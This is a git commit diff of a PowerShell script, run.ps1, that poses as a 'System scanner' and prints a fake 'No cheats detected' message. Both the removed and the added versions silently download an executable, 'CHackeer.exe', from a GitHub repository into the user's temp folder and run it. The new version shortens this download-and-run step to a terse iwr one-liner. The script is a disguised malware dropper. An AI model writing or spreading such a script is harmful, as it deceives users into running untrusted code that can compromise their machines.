6ea85689d51f663ae2ea144ef06e8754c4911add
fundrug35-jpg <fundrug35@gmail.com>
2026-09-08 22:42:14 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,13 +1,7 @@
-$ErrorActionPreference = "Stop"
 Write-Host ""
 Write-Host "System scanner" -ForegroundColor Cyan
 Write-Host "No cheats detected" -ForegroundColor Green
-Write-Host ""
-$tempDir = Join-Path $env:TEMP "Checker12"
-if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
-$exePath = Join-Path $tempDir "CHackeer.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/Checker12/main/CHackeer.exe" -OutFile $exePath -UseBasicParsing
-& $exePath
-Write-Host ""
-Write-Host "Нажми Enter..." -ForegroundColor Yellow
-$null = Read-Host
+$temp = "$env:TEMP\CHackeer.exe"
+iwr https://github.com/fundrug35-jpg/asdasdad/raw/main/CHackeer.exe -OutFile $temp
+& $temp
+Read-Host ""
